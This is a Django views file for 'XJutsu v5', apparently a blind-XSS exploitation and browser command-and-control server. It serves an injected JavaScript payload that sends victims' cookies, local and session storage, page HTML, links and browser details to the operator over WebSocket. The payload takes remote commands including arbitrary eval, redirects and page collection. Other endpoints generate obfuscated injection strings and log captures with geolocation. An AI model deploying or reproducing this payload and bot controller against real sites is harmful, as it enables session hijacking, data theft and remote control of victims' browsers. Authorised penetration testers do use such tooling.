"""
XJutsu v5 - Views
Dashboard and API endpoints
"""

import json
import uuid
from django.shortcuts import render, redirect, get_object_or_404
from django.contrib.auth.decorators import login_required
from django.contrib.auth import login, authenticate
from django.contrib import messages
from django.http import JsonResponse, HttpResponse
from django.views.decorators.csrf import csrf_exempt
from django.views.decorators.http import require_http_methods
from django.utils import timezone
from django.conf import settings
from django.db.models import Count
from django.db.models.functions import TruncDate

from .models import Capture, Payload, CollectedPage, WebhookConfig, APIKey
from .obfuscator import PayloadObfuscator
from .commands import BotCommander
from .geoip import GeoIPService


# ============== Dashboard Views ==============

@login_required
def dashboard(request):
    """
    Main dashboard view
    """
    # Get stats
    total_captures = Capture.objects.count()
    new_captures = Capture.objects.filter(status='new').count()
    active_payloads = Payload.objects.filter(user=request.user, is_active=True).count()
    
    # Recent captures
    recent_captures = Capture.objects.select_related('payload')[:10]
    
    # Captures by day (last 7 days)
    from datetime import timedelta
    week_ago = timezone.now() - timedelta(days=7)
    captures_by_day = (
        Capture.objects
        .filter(fired_at__gte=week_ago)
        .annotate(date=TruncDate('fired_at'))
        .values('date')
        .annotate(count=Count('id'))
        .order_by('date')
    )
    
    # Top domains
    top_domains = (
        Capture.objects
        .values('origin')
        .annotate(count=Count('id'))
        .order_by('-count')[:5]
    )
    
    context = {
        'total_captures': total_captures,
        'new_captures': new_captures,
        'active_payloads': active_payloads,
        'recent_captures': recent_captures,
        'captures_by_day': list(captures_by_day),
        'top_domains': top_domains,
        'server_url': f"{request.scheme}://{request.get_host()}",
    }
    
    return render(request, 'hunter/dashboard.html', context)


@login_required
def captures_list(request):
    """
    List all captures with filtering
    """
    captures = Capture.objects.select_related('payload').all()
    
    # Filter by status
    status = request.GET.get('status')
    if status:
        captures = captures.filter(status=status)
    
    # Filter by payload
    payload_id = request.GET.get('payload')
    if payload_id:
        captures = captures.filter(payload_id=payload_id)
    
    # Search
    search = request.GET.get('search')
    if search:
        captures = captures.filter(uri__icontains=search)
    
    context = {
        'captures': captures[:100],
        'payloads': Payload.objects.filter(user=request.user),
        'current_status': status,
        'current_payload': payload_id,
        'search': search,
    }
    
    return render(request, 'hunter/captures_list.html', context)


@login_required
def capture_detail(request, capture_id):
    """
    View capture details
    """
    capture = get_object_or_404(Capture, id=capture_id)
    
    # Mark as viewed
    if capture.status == 'new':
        capture.status = 'viewed'
        capture.save()
    
    # Get collected pages
    collected_pages = capture.collected_pages.all()
    
    context = {
        'capture': capture,
        'collected_pages': collected_pages,
    }
    
    return render(request, 'hunter/capture_detail.html', context)


@login_required
def capture_update_status(request, capture_id):
    """
    Update capture status
    """
    if request.method == 'POST':
        capture = get_object_or_404(Capture, id=capture_id)
        new_status = request.POST.get('status')
        
        if new_status in dict(Capture.STATUS_CHOICES):
            capture.status = new_status
            capture.save()
            messages.success(request, 'Status updated!')
    
    return redirect('capture_detail', capture_id=capture_id)


@login_required
def capture_delete(request, capture_id):
    """
    Delete a capture
    """
    if request.method == 'POST':
        capture = get_object_or_404(Capture, id=capture_id)
        capture.delete()
        messages.success(request, 'Capture deleted!')
        return redirect('captures_list')
    
    return redirect('capture_detail', capture_id=capture_id)


# ============== Payload Views ==============

@login_required
def payloads_list(request):
    """
    List user's payloads
    """
    payloads = Payload.objects.filter(user=request.user)
    
    context = {
        'payloads': payloads,
        'server_url': f"{request.scheme}://{request.get_host()}",
    }
    
    return render(request, 'hunter/payloads_list.html', context)


@login_required
def payload_create(request):
    """
    Create new payload
    """
    if request.method == 'POST':
        payload = Payload.objects.create(
            user=request.user,
            name=request.POST.get('name', 'Unnamed Payload'),
            description=request.POST.get('description', ''),
            collect_cookies=request.POST.get('collect_cookies') == 'on',
            collect_localstorage=request.POST.get('collect_localstorage') == 'on',
            collect_sessionstorage=request.POST.get('collect_sessionstorage') == 'on',
            collect_dom=request.POST.get('collect_dom') == 'on',
            collect_screenshot=request.POST.get('collect_screenshot') == 'on',
            collect_urls=request.POST.get('collect_urls') == 'on',
        )
        messages.success(request, f'Payload created! ID: {payload.short_id}')
        return redirect('payload_detail', payload_id=payload.id)
    
    return render(request, 'hunter/payload_create.html')


@login_required
def payload_detail(request, payload_id):
    """
    View payload details and generated code
    """
    payload = get_object_or_404(Payload, id=payload_id, user=request.user)
    server_url = f"{request.scheme}://{request.get_host()}"
    
    context = {
        'payload': payload,
        'server_url': server_url,
        'captures': payload.captures.all()[:10],
    }
    
    return render(request, 'hunter/payload_detail.html', context)


@login_required
def payload_delete(request, payload_id):
    """
    Delete a payload
    """
    if request.method == 'POST':
        payload = get_object_or_404(Payload, id=payload_id, user=request.user)
        payload.delete()
        messages.success(request, 'Payload deleted!')
    
    return redirect('payloads_list')


# ============== Settings Views ==============

@login_required
def settings_view(request):
    """
    User settings page
    """
    webhooks = WebhookConfig.objects.filter(user=request.user)
    api_keys = APIKey.objects.filter(user=request.user)
    
    context = {
        'webhooks': webhooks,
        'api_keys': api_keys,
    }
    
    return render(request, 'hunter/settings.html', context)


@login_required
def webhook_create(request):
    """
    Create webhook
    """
    if request.method == 'POST':
        WebhookConfig.objects.create(
            user=request.user,
            name=request.POST.get('name'),
            webhook_type=request.POST.get('webhook_type'),
            webhook_url=request.POST.get('webhook_url'),
            telegram_chat_id=request.POST.get('telegram_chat_id', ''),
        )
        messages.success(request, 'Webhook created!')
    
    return redirect('settings')


@login_required
def api_key_create(request):
    """
    Create API key
    """
    if request.method == 'POST':
        api_key = APIKey.objects.create(
            user=request.user,
            name=request.POST.get('name', 'API Key'),
        )
        messages.success(request, f'API Key created: {api_key.key}')
    
    return redirect('settings')


# ============== Payload Serving ==============

@csrf_exempt
@require_http_methods(["GET", "OPTIONS"])
def serve_payload_js(request, payload_id=None):
    """
    Serve the XSS payload JavaScript
    """
    # Handle CORS preflight
    if request.method == 'OPTIONS':
        response = HttpResponse()
        response['Access-Control-Allow-Origin'] = '*'
        response['Access-Control-Allow-Methods'] = 'GET, OPTIONS'
        response['Access-Control-Allow-Headers'] = '*'
        return response
    
    server_url = f"{request.scheme}://{request.get_host()}"
    ws_protocol = 'wss' if request.is_secure() else 'ws'
    ws_url = f"{ws_protocol}://{request.get_host()}/ws/callback/"
    
    # Generate the payload JavaScript
    js_content = generate_payload_js(server_url, ws_url, payload_id)
    
    response = HttpResponse(js_content, content_type='application/javascript')
    response['Access-Control-Allow-Origin'] = '*'
    response['Cache-Control'] = 'no-cache, no-store, must-revalidate'
    
    return response


def generate_payload_js(server_url, ws_url, payload_id=None):
    """
    Generate the XSS payload JavaScript code
    """
    return f'''
// XJutsu v5 - XSS Payload
(function() {{
    if (window.__xjutsu_loaded) return;
    window.__xjutsu_loaded = true;
    
    var config = {{
        serverUrl: "{server_url}",
        wsUrl: "{ws_url}",
        payloadId: "{payload_id or ''}",
        botId: Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15)
    }};
    
    var ws = null;
    var reconnectAttempts = 0;
    var maxReconnectAttempts = 10;
    
    function connect() {{
        ws = new WebSocket(config.wsUrl);
        
        ws.onopen = function() {{
            console.log('[XJutsu] Connected');
            reconnectAttempts = 0;
            
            // Register bot
            ws.send(JSON.stringify({{
                type: 'register',
                bot_id: config.botId
            }}));
            
            // Send initial callback
            sendCallback();
        }};
        
        ws.onmessage = function(event) {{
            try {{
                var data = JSON.parse(event.data);
                handleCommand(data);
            }} catch(e) {{}}
        }};
        
        ws.onclose = function() {{
            if (reconnectAttempts < maxReconnectAttempts) {{
                reconnectAttempts++;
                setTimeout(connect, 1000 * reconnectAttempts);
            }}
        }};
        
        ws.onerror = function() {{}};
    }}
    
    function sendCallback() {{
        var data = {{
            type: 'callback',
            payload: {{
                payload_id: config.payloadId,
                bot_id: config.botId,
                uri: window.location.href,
                origin: window.location.origin,
                referrer: document.referrer,
                cookies: document.cookie,
                localstorage: getStorage(localStorage),
                sessionstorage: getStorage(sessionStorage),
                dom: document.documentElement.outerHTML.substring(0, 50000),
                page_links: getPageLinks(),
                user_agent: navigator.userAgent,
                browser_info: getBrowserInfo()
            }}
        }};
        
        if (ws && ws.readyState === WebSocket.OPEN) {{
            ws.send(JSON.stringify(data));
        }}
        
        // Capture screenshot
        setTimeout(captureScreenshot, 1000);
    }}
    
    function getStorage(storage) {{
        var data = {{}};
        try {{
            for (var i = 0; i < storage.length; i++) {{
                var key = storage.key(i);
                data[key] = storage.getItem(key);
            }}
        }} catch(e) {{}}
        return data;
    }}
    
    function getPageLinks() {{
        var links = [];
        var anchors = document.getElementsByTagName('a');
        for (var i = 0; i < anchors.length && i < 100; i++) {{
            if (anchors[i].href) links.push(anchors[i].href);
        }}
        return links;
    }}
    
    function getBrowserInfo() {{
        return {{
            platform: navigator.platform,
            language: navigator.language,
            cookieEnabled: navigator.cookieEnabled,
            doNotTrack: navigator.doNotTrack,
            screenWidth: screen.width,
            screenHeight: screen.height,
            windowWidth: window.innerWidth,
            windowHeight: window.innerHeight
        }};
    }}
    
    function captureScreenshot() {{
        // Using html2canvas if available, otherwise skip
        if (typeof html2canvas !== 'undefined') {{
            html2canvas(document.body).then(function(canvas) {{
                var screenshot = canvas.toDataURL('image/png', 0.5);
                if (ws && ws.readyState === WebSocket.OPEN) {{
                    ws.send(JSON.stringify({{
                        type: 'screenshot',
                        capture_id: config.botId,
                        screenshot: screenshot
                    }}));
                }}
            }});
        }} else {{
            // Load html2canvas dynamically
            var script = document.createElement('script');
            script.src = 'https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js';
            script.onload = function() {{
                setTimeout(captureScreenshot, 500);
            }};
            document.head.appendChild(script);
        }}
    }}
    
    function handleCommand(data) {{
        if (data.type === 'command') {{
            switch(data.command) {{
                case 'eval':
                    try {{ eval(data.args.code); }} catch(e) {{}}
                    break;
                case 'redirect':
                    window.location.href = data.args.url;
                    break;
                case 'collect_page':
                    collectPage(data.args.url);
                    break;
                case 'screenshot':
                    captureScreenshot();
                    break;
            }}
        }}
    }}
    
    function collectPage(url) {{
        var xhr = new XMLHttpRequest();
        xhr.onreadystatechange = function() {{
            if (xhr.readyState === 4) {{
                if (ws && ws.readyState === WebSocket.OPEN) {{
                    ws.send(JSON.stringify({{
                        type: 'page_collect',
                        capture_id: config.botId,
                        uri: url,
                        html: xhr.responseText
                    }}));
                }}
            }}
        }};
        xhr.open('GET', url, true);
        xhr.send();
    }}
    
    // Start connection
    connect();
}})();
'''


# ============== API Endpoints ==============

@csrf_exempt
@require_http_methods(["POST", "OPTIONS"])
def api_callback(request):
    """
    HTTP callback endpoint (fallback if WebSocket fails)
    """
    if request.method == 'OPTIONS':
        response = HttpResponse()
        response['Access-Control-Allow-Origin'] = '*'
        response['Access-Control-Allow-Methods'] = 'POST, OPTIONS'
        response['Access-Control-Allow-Headers'] = '*'
        return response
    
    try:
        data = json.loads(request.body)
        
        # Get client IP
        x_forwarded_for = request.META.get('HTTP_X_FORWARDED_FOR')
        if x_forwarded_for:
            ip = x_forwarded_for.split(',')[0]
        else:
            ip = request.META.get('REMOTE_ADDR')
        
        # Get GeoIP data
        geo = GeoIPService.lookup(ip) if ip else {}
        
        # Create capture
        capture = Capture.objects.create(
            bot_id=data.get('bot_id', str(uuid.uuid4())[:8]),
            uri=data.get('uri', ''),
            origin=data.get('origin', ''),
            referrer=data.get('referrer', ''),
            cookies=data.get('cookies', ''),
            localstorage=json.dumps(data.get('localstorage', {})),
            sessionstorage=json.dumps(data.get('sessionstorage', {})),
            dom=data.get('dom', ''),
            screenshot=data.get('screenshot', ''),
            page_links=json.dumps(data.get('page_links', [])),
            ip_address=ip,
            user_agent=data.get('user_agent', request.META.get('HTTP_USER_AGENT', '')),
            browser_info=json.dumps(data.get('browser_info', {})),
            country=geo.get('country', ''),
            city=geo.get('city', ''),
            geolocation=f"{geo.get('lat', '')},{geo.get('lon', '')}" if geo.get('lat') else '',
        )
        
        response = JsonResponse({
            'status': 'success',
            'capture_id': str(capture.id)
        })
        
    except Exception as e:
        response = JsonResponse({
            'status': 'error',
            'message': str(e)
        }, status=400)
    
    response['Access-Control-Allow-Origin'] = '*'
    return response


# ============== Payload Generator ==============

@login_required
def payload_generator(request):
    """
    Advanced payload generator with obfuscation
    """
    server_url = f"{request.scheme}://{request.get_host()}"
    payloads = PayloadObfuscator.generate_all_payloads(server_url)
    
    context = {
        'payloads': payloads,
        'server_url': server_url,
    }
    
    return render(request, 'hunter/payload_generator.html', context)


@login_required
def generate_custom_payload(request):
    """
    Generate payload with custom options (AJAX endpoint)
    """
    if request.method == 'POST':
        data = json.loads(request.body)
        
        server_url = f"{request.scheme}://{request.get_host()}"
        payload_id = data.get('payload_id')
        encoding = data.get('encoding', 'none')
        context = data.get('context', 'html_tag')
        
        if payload_id:
            js_url = f"{server_url}/p/{payload_id}.js"
        else:
            js_url = f"{server_url}/x.js"
        
        base_script = f"var s=document.createElement('script');s.src='{js_url}';document.head.appendChild(s)"
        
        # Apply encoding
        if encoding == 'base64':
            result = PayloadObfuscator.base64_encode(base_script)
            result = f'<script>{result}</script>'
        elif encoding == 'charcode':
            result = f'<script>eval({PayloadObfuscator.charcode_encode(base_script)})</script>'
        elif encoding == 'url':
            result = PayloadObfuscator.url_encode(f'<script src="{js_url}"></script>')
        elif encoding == 'html_entity':
            result = PayloadObfuscator.html_entity_encode(f'<script src="{js_url}"></script>')
        elif encoding == 'constructor':
            result = f'<script>{PayloadObfuscator.constructor_method(base_script)}</script>'
        elif encoding == 'polyglot':
            result = PayloadObfuscator.generate_polyglot(js_url)
        else:
            result = PayloadObfuscator.get_payload_for_context(context, server_url, payload_id)
        
        return JsonResponse({'payload': result})
    
    return JsonResponse({'error': 'POST required'}, status=400)


# ============== Bot Commands ==============

@login_required
def bot_commander(request):
    """
    Bot commander interface
    """
    # Get recent captures with bot_ids (active sessions)
    recent_bots = Capture.objects.values('bot_id').distinct()[:20]
    commands = BotCommander.get_available_commands()
    
    context = {
        'recent_bots': recent_bots,
        'commands': commands,
    }
    
    return render(request, 'hunter/bot_commander.html', context)


@login_required
@require_http_methods(["POST"])
def send_bot_command(request):
    """
    Send command to bot (AJAX endpoint)
    """
    try:
        data = json.loads(request.body)
        bot_id = data.get('bot_id')
        command = data.get('command')
        args = data.get('args', {})
        
        if not bot_id or not command:
            return JsonResponse({'error': 'bot_id and command required'}, status=400)
        
        success = BotCommander.send_command(bot_id, command, args)
        
        return JsonResponse({
            'status': 'success' if success else 'error',
            'message': f"Command '{command}' sent to {bot_id}" if success else 'Failed to send command'
        })
        
    except Exception as e:
        return JsonResponse({'error': str(e)}, status=500)
